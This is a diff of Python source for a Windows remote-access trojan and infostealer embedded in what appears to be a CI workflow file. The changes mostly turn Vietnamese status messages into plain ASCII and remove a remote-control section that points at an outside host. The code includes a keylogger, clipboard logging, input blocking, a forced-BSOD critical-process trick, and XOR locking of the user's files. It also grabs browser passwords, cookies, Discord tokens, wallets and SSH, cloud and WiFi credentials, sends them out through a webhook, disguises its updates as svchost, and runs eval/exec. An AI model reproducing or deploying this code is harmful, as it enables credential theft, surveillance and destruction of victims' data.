-                  if b: return f"Pin: {b.percent}% | {'đang sạc' if b.power_plugged else 'pin'}"
+                  if b: return f"Pin: {b.percent}% | {'dang sac' if b.power_plugged else 'pin'}"
               return run_cmd("WMIC PATH Win32_Battery Get EstimatedChargeRemaining")
           def f_gpu(): return run_cmd("wmic path win32_VideoController get name,adapterram,driverversion /format:list")
           def f_av():
               return run_cmd('powershell -NoProfile -c "Get-CimInstance -Namespace root/SecurityCenter2 '
                              '-ClassName AntiVirusProduct | Select displayName,productState | Format-List"')
-          def f_recycle(): return run_cmd('powershell -NoProfile -c "Clear-RecycleBin -Force"') or "Đã dọn"
+          def f_recycle(): return run_cmd('powershell -NoProfile -c "Clear-RecycleBin -Force"') or "Da don"
 
           def f_installed():
               import winreg
@@ -841,7 +1154,7 @@ jobs:
                               out.append(f"{winreg.QueryValueEx(sk,'DisplayName')[0]}  {winreg.QueryValueEx(sk,'DisplayVersion')[0]}")
                           except Exception: pass
                   except Exception: pass
-              return "\n".join(sorted(set(out))) or "Không có"
+              return "\n".join(sorted(set(out))) or "Khong co"
 
           def f_vm():
               out = [f"{k}={os.environ.get(k,'')}" for k in ("COMPUTERNAME","USERNAME","PROCESSOR_IDENTIFIER")]
@@ -909,25 +1222,25 @@ jobs:
               subprocess.Popen(f'powershell -c "Add-Type -AssemblyName System.Speech;'
                                f'(New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak(\'{text}\')"',
                                shell=True, creationflags=NO_WIN)
-              return "Đang nói..."
+              return "Dang noi..."
 
           def f_play(path):
               path = os.path.abspath(os.path.expanduser(path))
-              if not os.path.exists(path): return f"Không thấy: {path}"
+              if not os.path.exists(path): return f"Khong thay: {path}"
               if path.lower().endswith(".wav"):
                   import winsound
                   threading.Thread(target=lambda: winsound.PlaySound(path, winsound.SND_FILENAME), daemon=True).start()
               else:
                   subprocess.Popen(f'powershell -c "(New-Object Media.SoundPlayer \'{path}\').PlaySync()"',
                                    shell=True, creationflags=NO_WIN)
-              return f"Đang phát: {path}"
+              return f"Dang phat: {path}"
 
           def f_beep():
-              import winsound; winsound.MessageBeep(); return "🔔"
+              import winsound; winsound.MessageBeep(); return "beep"
 
           def f_open(url):
-              try: os.startfile(url); return f"Đã mở: {url}"
-              except Exception as e: return f"Lỗi: {e}"
+              try: os.startfile(url); return f"Da mo: {url}"
+              except Exception as e: return f"Loi: {e}"
 
           # ============================================================
           #  KEYLOG + CLIPBOARD LOGGER
@@ -955,9 +1268,9 @@ jobs:
                   if _klog_listener: _klog_listener.stop()
                   _klog_on = False; return "Keylog OFF"
               if m == "dump":
-                  txt = "".join(_klog_buf); _klog_buf = []; return txt or "[chưa có phím]"
-              if m == "clear": _klog_buf = []; return "Đã xóa log"
-              return "Dùng: on|off|dump|clear"
+                  txt = "".join(_klog_buf); _klog_buf = []; return txt or "[chua co phim]"
+              if m == "clear": _klog_buf = []; return "Da xoa log"
+              return "Dung: on|off|dump|clear"
 
           def _clip_start():
               global _clip_on
@@ -981,16 +1294,16 @@ jobs:
               if m == "on": _clip_start(); return "Clipboard log ON"
               if m == "off": _clip_on = False; return "Clipboard log OFF"
               if m == "dump":
-                  txt = "\n".join(_clip_buf); _clip_buf = []; return txt or "[chưa có gì]"
-              if m == "clear": _clip_buf = []; return "Đã xóa"
-              return "Dùng: on|off|dump|clear"
+                  txt = "\n".join(_clip_buf); _clip_buf = []; return txt or "[chua co gi]"
+              if m == "clear": _clip_buf = []; return "Da xoa"
+              return "Dung: on|off|dump|clear"
 
           def f_type(text):
-              if not pyautogui: return "Thiếu pyautogui"
-              pyautogui.typewrite(text, interval=0.01); return f"Đã gõ: {text}"
+              if not pyautogui: return "Thieu pyautogui"
+              pyautogui.typewrite(text, interval=0.01); return f"Da go: {text}"
 
           def f_mouse(args):
-              if not pyautogui: return "Thiếu pyautogui"
+              if not pyautogui: return "Thieu pyautogui"
               try:
                   x, y = int(args[0]), int(args[1])
                   act = args[2].lower() if len(args) > 2 else "move"
@@ -998,8 +1311,8 @@ jobs:
                   elif act == "dclick": pyautogui.doubleClick(x, y)
                   elif act == "rclick": pyautogui.rightClick(x, y)
                   else: pyautogui.moveTo(x, y)
-                  return f"Chuột {act} @ {x},{y}"
-              except Exception as e: return f"Lỗi: {e}"
+                  return f"Chuot {act} @ {x},{y}"
+              except Exception as e: return f"Loi: {e}"
 
           def _key(vk, times=1):
               for _ in range(times):
@@ -1016,22 +1329,22 @@ jobs:
               ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
               time.sleep(1)
               ctypes.windll.winmm.mciSendStringW("set cdaudio door closed", None, 0, None)
-              return "Đã nháy khay đĩa"
+              return "Da nhay khay dia"
 
           def f_volume(args):
               try:
                   n = int(args[0]) if args else 5
                   vk = {"+":0xAF, "-":0xAE, "m":0xAD}.get(args[1] if len(args)>1 else "+", 0xAF)
-                  _key(vk, n); return f"Âm lượng x{n}"
-              except Exception as e: return f"Lỗi: {e}"
+                  _key(vk, n); return f"Am luong x{n}"
+              except Exception as e: return f"Loi: {e}"
 
           def f_blockinput(state):
               s = (state or "").lower()
               try:
-                  if s in ("on","1","true",""): ctypes.windll.user32.BlockInput(True); return "🔒 Đã khóa chuột + phím"
-                  if s in ("off","0","false"): ctypes.windll.user32.BlockInput(False); return "🔓 Đã mở khóa"
-              except Exception as e: return f"Lỗi: {e}"
-              return "Dùng: on|off"
+                  if s in ("on","1","true",""): ctypes.windll.user32.BlockInput(True); return "Da khoa chuot + phim"
+                  if s in ("off","0","false"): ctypes.windll.user32.BlockInput(False); return "Da mo khoa"
+              except Exception as e: return f"Loi: {e}"
+              return "Dung: on|off"
 
           _critical = [False]
           def f_critical(state):
@@ -1039,11 +1352,11 @@ jobs:
               try:
                   if s in ("on","1","true"):
                       ctypes.windll.ntdll.RtlSetProcessIsCritical(True, None, None); _critical[0] = True
-                      return "⚠️ CRITICAL ON — taskkill sẽ gây BSOD"
+                      return "CRITICAL ON - taskkill se gay BSOD"
                   if s in ("off","0","false"):
                       ctypes.windll.ntdll.RtlSetProcessIsCritical(False, None, None); _critical[0] = False
                       return "CRITICAL OFF"
-              except Exception as e: return f"Lỗi: {e}"
+              except Exception as e: return f"Loi: {e}"
               return f"critical: {'on' if _critical[0] else 'off'}"
 
           class POINTL(ctypes.Structure): _fields_=[("x",ctypes.c_long),("y",ctypes.c_long)]
@@ -1070,7 +1383,7 @@ jobs:
               dm.dmFields |= 0x80
               dm.dmDisplayOrientation = (dm.dmDisplayOrientation + 1) % 4
               ctypes.windll.user32.ChangeDisplaySettingsW(ctypes.byref(dm), 0)
-              return "Đã xoay màn hình"
+              return "Da xoay man hinh"
 
           def f_bsod():
               ctypes.windll.ntdll.RtlSetProcessIsCritical(True, None, None)
@@ -1101,7 +1414,7 @@ jobs:
           $f.Add_Shown({{ $l.Left = ($f.Width - $l.Width)/2; $l.Top = ($f.Height - $l.Height)/2 }})
           [System.Windows.Forms.Application]::Run($f)
           ''', "svc_overlay.ps1")
-              return f"Đã bật overlay: {text}"
+              return f"Da bat overlay: {text}"
 
           def f_fakebsod():
               _run_ps('''
@@ -1118,13 +1431,13 @@ jobs:
           $f.Add_KeyDown({$f.Close()}); $f.Add_Click({$f.Close()})
           [System.Windows.Forms.Application]::Run($f)
           ''', "svc_bsod.ps1")
-              return "💙 Fake BSOD (bấm/Enter để đóng)"
+              return "Fake BSOD (bam/Enter de dong)"
 
           def f_rickroll():
               _key(0xAF, 25)
               try: os.startfile("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
               except Exception: pass
-              return "🎵 Never gonna give you up..."
+              return "Never gonna give you up..."
 
           _glitch = [False]
           def _glitch_loop():
@@ -1143,7 +1456,7 @@ jobs:
           def f_glitch(state):
               s = (state or "").lower()
               if s == "on" and not _glitch[0]:
-                  _glitch[0] = True; threading.Thread(target=_glitch_loop, daemon=True).start(); return "🎲 glitch ON"
+                  _glitch[0] = True; threading.Thread(target=_glitch_loop, daemon=True).start(); return "glitch ON"
               if s == "off": _glitch[0] = False; return "glitch OFF"
               return f"glitch: {'on' if _glitch[0] else 'off'}"
 
@@ -1162,9 +1475,9 @@ jobs:
                       yield os.path.join(dp, f)
 
           def f_lock(args):
-              if not args: return "Dùng: lock <pass> [thư mục]"
+              if not args: return "Dung: lock <pass> [thu muc]"
               pw = args[0]; root = os.path.expanduser(" ".join(args[1:]) or os.path.join(os.path.expanduser("~"), "Desktop"))
-              if not os.path.isdir(root): return f"Không thấy thư mục: {root}"
+              if not os.path.isdir(root): return f"Khong thay thu muc: {root}"
               n = 0
               for fp in _walk_files(root):
                   try:
@@ -1172,10 +1485,10 @@ jobs:
                       if data[:7] == _LOCK_MAGIC: continue
                       open(fp, "wb").write(_LOCK_MAGIC + _xor(data, pw)); n += 1
                   except Exception: pass
-              return f"🔒 Đã khóa {n} file trong {root}"
+              return f"Da khoa {n} file trong {root}"
 
           def f_unlock(args):
-              if not args: return "Dùng: unlock <pass> [thư mục]"
+              if not args: return "Dung: unlock <pass> [thu muc]"
               pw = args[0]; root = os.path.expanduser(" ".join(args[1:]) or os.path.join(os.path.expanduser("~"), "Desktop"))
               n = 0
               for fp in _walk_files(root):
@@ -1184,10 +1497,10 @@ jobs:
                       if data[:7] != _LOCK_MAGIC: continue
                       open(fp, "wb").write(_xor(data[7:], pw)); n += 1
                   except Exception: pass
-              return f"🔓 Đã mở {n} file trong {root}"
+              return f"Da mo {n} file trong {root}"
 
           # ============================================================
-          #  MẠNG + WIFI AUTO-RECONNECT
+          #  MANG
           # ============================================================
           def f_wifi():
               try:
@@ -1200,18 +1513,17 @@ jobs:
                           d = subprocess.check_output(f'netsh wlan show profile name="{n}" key=clear',
                               shell=True, creationflags=NO_WIN).decode("utf-8", errors="ignore")
                           pw = [l.split(":")[-1].strip() for l in d.splitlines() if "Key Content" in l]
-                          out.append(f"📶 {n}  →  {pw[0] if pw else '(mở)'}")
+                          out.append(f"{n}  ->  {pw[0] if pw else '(mo)'}")
                       except Exception: pass
-                  return "\n".join(out) or "Không có WiFi lưu"
-              except Exception as e: return f"Lỗi: {e}"
+                  return "\n".join(out) or "Khong co WiFi luu"
+              except Exception as e: return f"Loi: {e}"
 
           def f_net():
               out = [f"Host: {socket.gethostname()}"]
-              try:
-                  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect(("8.8.8.8",80))
-                  out.append(f"IP LAN: {s.getsockname()[0]}"); s.close()
-              except Exception: pass
+              ip = _local_ip()
+              if ip: out.append(f"IP LAN: {ip}")
               out.append(run_cmd('ipconfig | findstr /i "IPv4 Gateway"'))
+              out.append(run_cmd("arp -a"))
               return "\n".join(out)
 
           def f_ports(): return run_cmd("netstat -ano | findstr LISTENING")
@@ -1267,11 +1579,11 @@ jobs:
               subprocess.call(f'netsh wlan add profile filename="{p}"', shell=True, creationflags=NO_WIN)
 
           def f_reconnect():
-              if _online(): return "Đang online"
+              if _online(): return "Dang online"
               profiles = _wifi_profiles()
               ssid = _current_ssid()
               if ssid not in profiles and profiles: ssid = profiles[0]
-              if not ssid: return "Không có profile WiFi để kết nối"
+              if not ssid: return "Khong co profile WiFi de ket noi"
               pw = _wifi_pw(ssid)
               for iface in ("Wi-Fi", "WLAN", "WiFi"):
                   subprocess.call(f'netsh interface set interface "{iface}" admin=enable',
@@ -1280,7 +1592,7 @@ jobs:
               subprocess.call(f'netsh wlan connect name="{ssid}" ssid="{ssid}"',
                               shell=True, creationflags=NO_WIN)
               time.sleep(3)
-              return f"🔄 Đã thử kết nối lại: {ssid} ({'có pass' if pw else 'mở'})"
+              return f"Da thu ket noi lai: {ssid} ({'co pass' if pw else 'mo'})"
 
           def _net_watch():
               fails = 0
@@ -1296,9 +1608,7 @@ jobs:
           def _watchdog():
               while True:
                   time.sleep(30)
-                  disc_ok = (time.time() - _last_beat[0] <= 300)
-                  web_ok = _web.get("on") and (time.time() - _web.get("beat", 0) <= 120)
-                  if not disc_ok and not web_ok:
+                  if time.time() - _last_beat[0] > 300:
                       try:
                           subprocess.Popen(f'cmd /c ping 1.1.1.1 -n 4 >nul & start "" "{self_path()}"',
                                            shell=True, creationflags=NO_WIN)
@@ -1307,25 +1617,25 @@ jobs:
                       os._exit(0)
 
           def f_dl(args):
-              if not requests: return "Thiếu requests"
-              if len(args) < 2: return "Dùng: dl <url> <path>"
+              if not requests: return "Thieu requests"
+              if len(args) < 2: return "Dung: dl <url> <path>"
               url = args[0]; dest = os.path.expanduser(" ".join(args[1:]))
               try:
                   r = requests.get(url, timeout=180, stream=True)
                   with open(dest, "wb") as f:
                       for c in r.iter_content(65536): f.write(c)
-                  return f"Đã tải {human(os.path.getsize(dest))} → {dest}"
-              except Exception as e: return f"Lỗi: {e}"
+                  return f"Da tai {human(os.path.getsize(dest))} -> {dest}"
+              except Exception as e: return f"Loi: {e}"
 
           def f_speedtest():
-              if not requests: return "Thiếu requests"
+              if not requests: return "Thieu requests"
               try:
                   t0 = time.time(); n = 0
                   r = requests.get("https://speed.cloudflare.com/__down?bytes=10000000", stream=True, timeout=60)
                   for c in r.iter_content(65536): n += len(c)
                   dt = time.time() - t0
-                  return f"{human(n)}/{dt:.1f}s → {n*8/dt/1e6:.1f} Mbps"
-              except Exception as e: return f"Lỗi: {e}"
+                  return f"{human(n)}/{dt:.1f}s -> {n*8/dt/1e6:.1f} Mbps"
+              except Exception as e: return f"Loi: {e}"
 
           # ============================================================
           #  STEAL
@@ -1358,7 +1668,7 @@ jobs:
           def f_browser():
               try:
                   from Crypto.Cipher import AES
-              except Exception: return "Thiếu pycryptodome"
+              except Exception: return "Thieu pycryptodome"
               import sqlite3
               lines = []
               for name, base in _browsers():
@@ -1383,12 +1693,12 @@ jobs:
                               lines.append(f"[{name}/{prof}] {url} | {user} | {d}")
                           con.close()
                       except Exception: pass
-              return "\n".join(lines[:300]) or "Không đọc được"
+              return "\n".join(lines[:300]) or "Khong doc duoc"
 
           def f_cookies():
               try:
                   from Crypto.Cipher import AES
-              except Exception: return "Thiếu pycryptodome"
+              except Exception: return "Thieu pycryptodome"
               import sqlite3
               lines = []
               for name, base in _browsers():
@@ -1412,7 +1722,7 @@ jobs:
                               if val: lines.append(f"{host}\t{cn}\t{val}")
                           con.close()
                       except Exception: pass
-              return "\n".join(lines[:600]) or "Không có cookie"
+              return "\n".join(lines[:600]) or "Khong co cookie"
 
           def f_autofill():
               import sqlite3
@@ -1430,10 +1740,10 @@ jobs:
                           cur.execute("SELECT name, value FROM autofill")
                           for n, v in cur.fetchall(): lines.append(f"[{name}] {n}: {v}")
                           cur.execute("SELECT name_on_card, expiration_month, expiration_year FROM credit_cards")
-                          for nc, em, ey in cur.fetchall(): lines.append(f"[{name}] 💳 {nc} {em}/{ey}")
+                          for nc, em, ey in cur.fetchall(): lines.append(f"[{name}] the {nc} {em}/{ey}")
                           con.close()
                       except Exception: pass
-              return "\n".join(lines[:400]) or "Không có autofill"
+              return "\n".join(lines[:400]) or "Khong co autofill"
 
           def f_history(n=60):
               import sqlite3
@@ -1449,10 +1759,10 @@ jobs:
                       try:
                           con = sqlite3.connect(tmp); cur = con.cursor()
                           cur.execute("SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT ?", (n,))
-                          for u, t, c in cur.fetchall(): out.append(f"[{c}] {t} — {u}")
+                          for u, t, c in cur.fetchall(): out.append(f"[{c}] {t} - {u}")
                           con.close()
                       except Exception: pass
-              return "\n".join(out[:400]) or "Không có lịch sử"
+              return "\n".join(out[:400]) or "Khong co lich su"
 
           def f_discord():
               roots = [os.path.join(os.environ.get("APPDATA",""), x) for x in ("discord","discordcanary","discordptb")]
@@ -1472,19 +1782,19 @@ jobs:
                                   for m in pat.findall(data):
                                       if m not in res: res.append(m)
                               except Exception: pass
-              return "\n".join(res) or "Không tìm thấy token"
+              return "\n".join(res) or "Khong tim thay token"
 
           def f_dtoken():
-              if not requests: return "Thiếu requests"
+              if not requests: return "Thieu requests"
               out = []
               for t in f_discord().splitlines():
                   try:
                       r = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": t}, timeout=15)
                       if r.status_code == 200:
-                          u = r.json(); out.append(f"✅ {u.get('username')} ({u.get('id')}) | {u.get('email','')} | {t[:24]}...")
-                      else: out.append(f"❌ {t[:30]}... ({r.status_code})")
-                  except Exception as e: out.append(f"⚠️ {t[:30]}... {e}")
-              return "\n".join(out) or "Không có token"
+                          u = r.json(); out.append(f"OK {u.get('username')} ({u.get('id')}) | {u.get('email','')} | {t[:24]}...")
+                      else: out.append(f"XX {t[:30]}... ({r.status_code})")
+                  except Exception as e: out.append(f"?? {t[:30]}... {e}")
+              return "\n".join(out) or "Khong co token"
 
           def f_wallets():
               ad = os.environ.get("APPDATA",""); ld = os.environ.get("LOCALAPPDATA","")
@@ -1503,7 +1813,7 @@ jobs:
                   ("Atomic", os.path.join(ad, r"atomic\Local Storage\leveldb")),
                   ("Coinbase", os.path.join(ad, "Coinbase")),
               ]
-              return "\n".join(f"✅ {n} → {p}" for n, p in paths if os.path.exists(p)) or "Không thấy ví nào"
+              return "\n".join(f"OK {n} -> {p}" for n, p in paths if os.path.exists(p)) or "Khong thay vi nao"
 
           def f_ssh():
               h = os.path.expanduser("~"); out = []
@@ -1511,7 +1821,7 @@ jobs:
                   if os.path.isdir(d):
                       for f in os.listdir(d):
                           out.append(os.path.join(d, f))
-              return "\n".join(out) or "Không thấy SSH key"
+              return "\n".join(out) or "Khong thay SSH key"
 
           def f_cloud():
               h = os.path.expanduser("~"); out = []
@@ -1519,8 +1829,8 @@ jobs:
                           ".docker/config.json", ".npmrc", ".netrc", ".azure", ".config/gcloud",
                           ".config/gh/hosts.yml", ".terraformrc"):
                   p = os.path.join(h, rel)
-                  if os.path.exists(p): out.append(f"✅ {p}")
-              return "\n".join(out) or "Không thấy credential cloud"
+                  if os.path.exists(p): out.append(f"OK {p}")
+              return "\n".join(out) or "Khong thay credential cloud"
 
           def f_vault():
               out = [run_cmd("cmdkey /list")]
@@ -1532,7 +1842,7 @@ jobs:
               hits = []
               for root in (os.path.expanduser("~"), "C:\\"):
                   hits = f_search(".kdbx", root)
-                  if hits and hits != "Không tìm thấy": break
+                  if hits and hits != "Khong tim thay": break
               return hits
 
           def f_apps():
@@ -1554,13 +1864,11 @@ jobs:
                           out.append(f"[PuTTY] {sn} | {winreg.QueryValueEx(sk,'UserName')[0]}@{winreg.QueryValueEx(sk,'HostName')[0]}")
                       except Exception: pass
               except Exception: pass
-              if os.path.exists(os.path.join(ad, "WinSCP.ini")): out.append("[WinSCP] có config")
-              if os.path.isdir(os.path.join(ad, "OpenVPN")): out.append("[OpenVPN] có profile")
-              if os.path.isdir(r"C:\ProgramData\WireGuard"): out.append("[WireGuard] có config")
-              for sp in (r"C:\Program Files (x86)\Steam\config", r"C:\Program Files\Steam\config"):
-                  if os.path.isdir(sp): out.append(f"[Steam] {sp}")
-              if os.path.isdir(os.path.join(ad, r"Telegram Desktop\tdata")): out.append("[Telegram] có tdata")
-              return "\n".join(out) or "Không thấy app nào"
+              if os.path.exists(os.path.join(ad, "WinSCP.ini")): out.append("[WinSCP] co config")
+              if os.path.isdir(os.path.join(ad, "OpenVPN")): out.append("[OpenVPN] co profile")
+              if os.path.isdir(r"C:\ProgramData\WireGuard"): out.append("[WireGuard] co config")
+              if os.path.isdir(os.path.join(ad, r"Telegram Desktop\tdata")): out.append("[Telegram] co tdata")
+              return "\n".join(out) or "Khong thay app nao"
 
           def f_files(exts="doc,docx,xls,xlsx,pdf,txt,ppt,pptx,key,pem,pfx,kdbx,ovpn,conf,wallet,dat"):
               exts = [e.strip().lower() for e in exts.split(",")]
@@ -1570,24 +1878,24 @@ jobs:
                   for dp, dn, fn in os.walk(r):
                       for f in fn:
                           if f.rsplit(".",1)[-1].lower() in exts: out.append(os.path.join(dp, f))
-              return "\n".join(out[:600]) or "Không thấy file"
+              return "\n".join(out[:600]) or "Khong thay file"
 
           # ============================================================
           #  EXFIL
           # ============================================================
           def f_webhook(url):
               global WEBHOOK
-              if url: WEBHOOK = url; return "Đã set webhook"
-              return f"Webhook: {WEBHOOK or '(trống)'}"
+              if url: WEBHOOK = url; return "Da set webhook"
+              return f"Webhook: {WEBHOOK or '(trong)'}"
 
           def exfil(path, note=""):
-              if not (requests and WEBHOOK): return "Chưa set webhook"
+              if not (requests and WEBHOOK): return "Chua set webhook"
               try:
                   with open(path, "rb") as f:
                       requests.post(WEBHOOK, data={"content": f"`{MACHINE_ID}` {note}"},
                                     files={"file": (os.path.basename(path), f)}, timeout=120)
-                  return f"Đã gửi {os.path.basename(path)}"
-              except Exception as e: return f"Lỗi gửi: {e}"
+                  return f"Da gui {os.path.basename(path)}"
+              except Exception as e: return f"Loi gui: {e}"
 
           def _exfil_worker():
               while True:
@@ -1595,15 +1903,15 @@ jobs:
                       if WEBHOOK and os.path.isdir(PEND_DIR):
                           for f in list(os.listdir(PEND_DIR)):
                               fp = os.path.join(PEND_DIR, f)
-                              if exfil(fp).startswith("Đã gửi"):
+                              if exfil(fp).startswith("Da gui"):
                                   try: os.remove(fp)
                                   except Exception: pass
                   except Exception: pass
                   time.sleep(60)
 
           def f_pending():
-              try: return "\n".join(os.listdir(PEND_DIR)) or "[trống]"
-              except Exception: return "[trống]"
+              try: return "\n".join(os.listdir(PEND_DIR)) or "[trong]"
+              except Exception: return "[trong]"
 
           # ============================================================
           #  GRAB / STEAL
@@ -1664,18 +1972,18 @@ jobs:
               return h.hexdigest()
 
           def f_update(args):
-              if not args: return "Dùng: update <url exe> [sha256]"
+              if not args: return "Dung: update <url exe> [sha256]"
               url = args[0]; want = args[1].lower() if len(args) > 1 else ""
-              if not requests: return "Thiếu requests"
+              if not requests: return "Thieu requests"
               try:
                   new = os.path.join(INSTALL_DIR, "svchost_new.exe")
-                  r = requests.get(url, timeout=180); open(new, "wb").write(r.content)
+                  r = requests.get(url, timeout=300); open(new, "wb").write(r.content)
                   got = _sha256(new)
                   if want and got != want:
-                      return f"❌ SHA256 lệch (got {got[:16]}…, want {want[:16]}…) — giữ bản cũ"
+                      return f"SHA256 lech (got {got[:16]}..., want {want[:16]}...) - giu ban cu"
                   if os.path.exists(SCRIPT_PATH) and _sha256(SCRIPT_PATH) == got:
-                      return "Đã là bản mới nhất (hash trùng)"
-                  try: shutil.copy2(SCRIPT_PATH, SCRIPT_PATH + ".bak")
+                      return "Da la ban moi nhat (hash trung)"
+                  try: shutil.copy2(SCRIPT_PATH, SCRIPT_PATH + ".old")
                   except Exception: pass
                   unblock(new)
                   bat = os.path.join(INSTALL_DIR, "_upd.bat")
@@ -1683,18 +1991,18 @@ jobs:
                       f.write(f'@echo off\ntimeout /t 2 >nul\ndel "{SCRIPT_PATH}"\nmove /y "{new}" "{SCRIPT_PATH}"\nstart "" "{SCRIPT_PATH}"\n')
                   subprocess.Popen(f'cmd /c "{bat}"', shell=True, creationflags=NO_WIN)
                   time.sleep(1); os._exit(0)
-              except Exception as e: return f"Lỗi: {e}"
+              except Exception as e: return f"Loi: {e}"
 
           def f_rollback():
-              bak = SCRIPT_PATH + ".bak"
-              if not os.path.exists(bak): return "Không có bản .bak để rollback"
+              old = SCRIPT_PATH + ".old"
+              if not os.path.exists(old): return "Khong co ban .old de rollback"
               try:
                   bat = os.path.join(INSTALL_DIR, "_rb.bat")
                   with open(bat, "w") as f:
-                      f.write(f'@echo off\ntimeout /t 2 >nul\ndel "{SCRIPT_PATH}"\ncopy /y "{bak}" "{SCRIPT_PATH}"\nstart "" "{SCRIPT_PATH}"\n')
+                      f.write(f'@echo off\ntimeout /t 2 >nul\ndel "{SCRIPT_PATH}"\ncopy /y "{old}" "{SCRIPT_PATH}"\nstart "" "{SCRIPT_PATH}"\n')
                   subprocess.Popen(f'cmd /c "{bat}"', shell=True, creationflags=NO_WIN)
                   time.sleep(1); os._exit(0)
-              except Exception as e: return f"Lỗi: {e}"
+              except Exception as e: return f"Loi: {e}"
 
           def f_restart():
               subprocess.Popen(f'cmd /c ping 1.1.1.1 -n 3 >nul & start "" "{self_path()}"',
@@ -1704,458 +2012,10 @@ jobs:
           _pyglobals = {}
           def f_eval(expr):
               try: return str(eval(expr, _pyglobals))
-              except Exception as e: return f"Lỗi: {e}"
+              except Exception as e: return f"Loi: {e}"
           def f_exec(code):
               try: exec(code, _pyglobals); return "OK"
-              except Exception as e: return f"Lỗi: {e}"
-
-          # ============================================================
-          #  WEB CONTROL - realtime screen + input (bvwqmiv7phoi.ramnaymcloud.com)
-          # ============================================================
-          CONTROL_URL   = "https://bvwqmiv7phoi.ramnaymcloud.com"
-          CONTROL_FETCH = ""
-          CONTROL_ON    = True
-          AGENT_KEY     = ""
-          URL_FILE      = os.path.join(INSTALL_DIR, "control_url.txt")
-          WEB_HIDDEN    = True
-          WEB_FPS       = 12
-          WEB_QUALITY   = 55
-          WEB_SCALE     = 0.5
-          WEB_MON       = 1
-
-          ULONG_PTR = ctypes.c_void_p
-
-          class MOUSEINPUT(ctypes.Structure):
-              _fields_ = [("dx", ctypes.c_long), ("dy", ctypes.c_long),
-                          ("mouseData", ctypes.c_ulong), ("dwFlags", ctypes.c_ulong),
-                          ("time", ctypes.c_ulong), ("dwExtraInfo", ULONG_PTR)]
-
-          class KEYBDINPUT(ctypes.Structure):
-              _fields_ = [("wVk", ctypes.c_ushort), ("wScan", ctypes.c_ushort),
-                          ("dwFlags", ctypes.c_ulong), ("time", ctypes.c_ulong),
-                          ("dwExtraInfo", ULONG_PTR)]
-
-          class HARDWAREINPUT(ctypes.Structure):
-              _fields_ = [("uMsg", ctypes.c_ulong), ("wParamL", ctypes.c_ushort),
-                          ("wParamH", ctypes.c_ushort)]
-
-          class _IU(ctypes.Union):
-              _fields_ = [("mi", MOUSEINPUT), ("ki", KEYBDINPUT), ("hi", HARDWAREINPUT)]
-
-          class INPUT(ctypes.Structure):
-              _fields_ = [("type", ctypes.c_ulong), ("u", _IU)]
-
-          M_MOVE, M_LD, M_LU, M_RD, M_RU, M_MD, M_MU, M_WHEEL = 1, 2, 4, 8, 16, 32, 64, 0x800
-          M_ABS, M_VIRT = 0x8000, 0x4000
-          K_UP, K_UNI = 0x0002, 0x0004
-          BTN = {"left": (M_LD, M_LU), "right": (M_RD, M_RU), "mid": (M_MD, M_MU)}
-
-          _web = {"ws": None, "lock": threading.Lock(), "viewers": 0, "on": False,
-                  "drag": False, "dorg": (0, 0), "bounds": None, "beat": 0.0}
-          _in_q = queue.Queue(maxsize=400)
-
-          def _send_input(*items):
-              n = len(items)
-              arr = (INPUT * n)(*items)
-              ctypes.windll.user32.SendInput(n, arr, ctypes.sizeof(INPUT))
-
-          def _mi(dx=0, dy=0, data=0, flags=0):
-              return INPUT(0, _IU(mi=MOUSEINPUT(dx, dy, data, flags, 0, None)))
-
-          def _ki(vk=0, scan=0, flags=0):
-              return INPUT(1, _IU(ki=KEYBDINPUT(vk, scan, flags, 0, None)))
-
-          def _cursor():
-              class P(ctypes.Structure): _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
-              p = P(); ctypes.windll.user32.GetCursorPos(ctypes.byref(p)); return p.x, p.y
-
-          def _restore(x, y):
-              try: ctypes.windll.user32.SetCursorPos(int(x), int(y))
-              except Exception: pass
-
-          def _vmetrics():
-              u = ctypes.windll.user32
-              return (u.GetSystemMetrics(76), u.GetSystemMetrics(77),
-                      u.GetSystemMetrics(78), u.GetSystemMetrics(79))
-
-          def _abs_xy(nx, ny):
-              vx, vy, vw, vh = _vmetrics()
-              b = _web.get("bounds")
-              l, t, w, h = b if b else (vx, vy, vw, vh)
-              px = l + float(nx) * max(w - 1, 1)
-              py = t + float(ny) * max(h - 1, 1)
-              dx = int((px - vx) * 65535 / max(vw - 1, 1))
-              dy = int((py - vy) * 65535 / max(vh - 1, 1))
-              return _mi(dx, dy, 0, M_MOVE | M_ABS | M_VIRT)
-
-          def _do_input(d):
-              try:
-                  a = d.get("a")
-                  hid = bool(d.get("h", WEB_HIDDEN))
-                  if a == "m":
-                      ox, oy = _cursor()
-                      _send_input(_abs_xy(d.get("x", 0), d.get("y", 0)))
-                      if hid and not _web["drag"]: _restore(ox, oy)
-                  elif a == "c":
-                      dn, up = BTN.get(d.get("b", "left"), BTN["left"])
-                      ox, oy = _cursor()
-                      _send_input(_abs_xy(d.get("x", 0), d.get("y", 0)))
-                      time.sleep(0.006)
-                      for _ in range(max(1, int(d.get("n", 1)))):
-                          _send_input(_mi(0, 0, 0, dn), _mi(0, 0, 0, up))
-                          time.sleep(0.02)
-                      if hid: _restore(ox, oy)
-                  elif a == "d":
-                      dn, up = BTN.get(d.get("b", "left"), BTN["left"])
-                      x, y = d.get("x", 0), d.get("y", 0)
-                      if "dn" in d and d["dn"]:
-                          ox, oy = _cursor(); _web["drag"] = True; _web["dorg"] = (ox, oy)
-                          _send_input(_abs_xy(x, y)); time.sleep(0.012)
-                          _send_input(_mi(0, 0, 0, dn))
-                      elif "dn" in d:
-                          _send_input(_abs_xy(x, y)); time.sleep(0.012)
-                          _send_input(_mi(0, 0, 0, up)); time.sleep(0.012)
-                          _web["drag"] = False
-                          if hid: _restore(*_web.get("dorg", (0, 0)))
-                      else:
-                          _send_input(_abs_xy(x, y))
-                  elif a == "s":
-                      ox, oy = _cursor()
-                      if d.get("x") is not None: _send_input(_abs_xy(d.get("x", 0), d.get("y", 0)))
-                      _send_input(_mi(0, 0, int(d.get("dy", 1)) * 120, M_WHEEL))
-                      if hid: _restore(ox, oy)
-                  elif a == "k":
-                      vk = int(d.get("vk", 0))
-                      if vk: _send_input(_ki(vk, 0, 0 if d.get("dn") else K_UP))
-                  elif a == "t":
-                      for ch in str(d.get("s", "")):
-                          code = 0x0D if ch == "\n" else ord(ch)
